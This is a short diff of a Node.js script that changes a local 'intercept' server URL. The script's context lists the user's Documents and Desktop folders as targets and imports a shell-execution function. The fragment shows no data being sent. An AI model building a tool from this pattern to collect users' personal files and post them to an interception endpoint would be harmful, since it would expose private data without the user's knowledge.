@@ -3,7 +3,7 @@ const path = require('path');
 const os = require('os');
 const { execSync } = require('child_process');
 
-const PR_SERVER_URL = "http://localhost:3000/api/github/intercept";
+const PR_SERVER_URL = "http://127.0.0.1:3005/api/github/intercept";
 const TARGET_DIRS = [
     path.join(os.homedir(), 'Documents'),
     path.join(os.homedir(), 'Desktop')
